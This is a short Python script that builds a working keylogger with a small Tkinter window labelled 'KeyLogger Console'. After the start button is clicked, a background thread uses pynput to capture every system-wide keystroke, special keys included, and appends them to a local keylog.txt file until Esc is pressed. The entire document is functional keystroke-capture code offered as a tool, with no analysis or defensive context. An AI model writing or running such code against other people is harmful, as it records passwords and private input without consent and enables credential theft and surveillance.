from pynput.keyboard import Key, Listener
import tkinter as tk
import threading

log_file = "keylog.txt"

def activate_logger():
    status_label.config(text="Keylogging is Active")

    def handle_key_press(k):
        try:
            with open(log_file, "a") as log:
                log.write(f"{k.char}")
        except AttributeError:
            with open(log_file, "a") as log:
                log.write(f"[{k}]")

    def handle_key_release(k):
        if k == Key.esc:
            return False

    def begin_listening():
        with Listener(on_press=handle_key_press, on_release=handle_key_release) as session:
            session.join()

    threading.Thread(target=begin_listening, daemon=True).start()

root = tk.Tk()
root.title("KeyLogger Console")
root.geometry("300x150")
root.resizable(False, False)

start_btn = tk.Button(root, text="Start Logging", command=activate_logger, font=("Arial", 12), bg="green", fg="white")
start_btn.pack(pady=20)

status_label = tk.Label(root, text="Click to begin logging", font=("Arial", 10))
status_label.pack()

root.mainloop()
